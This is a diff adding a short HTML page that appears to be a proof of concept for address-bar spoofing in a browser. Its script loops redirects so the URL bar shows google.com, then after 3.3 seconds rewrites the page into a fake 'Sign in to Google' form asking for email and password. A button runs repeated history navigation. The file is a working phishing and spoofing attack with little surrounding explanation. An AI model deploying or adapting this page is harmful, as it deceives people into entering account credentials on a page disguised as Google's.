@@ -1,0 +1,32 @@
+<!DOCTYPE html>
+<html>
+<body>
+<script>
+    // Repeated redirect to spoof trusted site
+    v = setInterval(`x=document.location='https://jigsaw.w3.org/HTTP/Basic/';x.location = 'https://www.google.com'`, 100);
+
+    // After 3.3 seconds, replace page content with fake login and stop redirects
+    i = setInterval(`
+        document.open();
+        document.write(\`
+            <style>
+                body { font-family: sans-serif; margin-top: 100px; text-align: center; }
+                input { margin: 10px; padding: 10px; width: 250px; font-size: 16px; }
+                button { padding: 10px 20px; font-size: 16px; }
+            </style>
+            <h1>Sign in to Google</h1>
+            <input type="email" placeholder="Email or phone" /><br>
+            <input type="password" placeholder="Enter your password" /><br>
+            <button>Next</button>
+            <p style="color:gray">To continue to Gmail</p>
+        \`);
+        document.close();
+        clearInterval(v);
+        clearInterval(i);
+    `, 3300);
+</script>
+
+<h1>URL Spoofing Bar</h1>
+<input onclick="setInterval(function(){window.history.go(-1)}, 30)" type="button" value="Go to google.com" />
+</body>
+</html>
